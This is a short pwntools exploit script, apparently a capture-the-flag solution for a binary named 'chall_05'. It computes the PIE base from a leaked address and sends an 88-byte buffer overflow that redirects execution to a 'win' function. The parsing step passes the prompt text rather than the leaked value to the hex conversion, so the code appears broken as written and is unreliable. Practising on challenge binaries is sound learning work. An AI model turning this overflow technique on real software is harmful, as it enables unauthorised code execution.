p = process("./chall_05")
leak_output = p.recvuntil(b"this is: ")


intleak = int(leak_output,16)

elf=ELF("./chall_05")


elf.address = intleak - elf.sym.main

hex(elf.address)


p.sendline(b'a'*88+p64(elf.sym.win))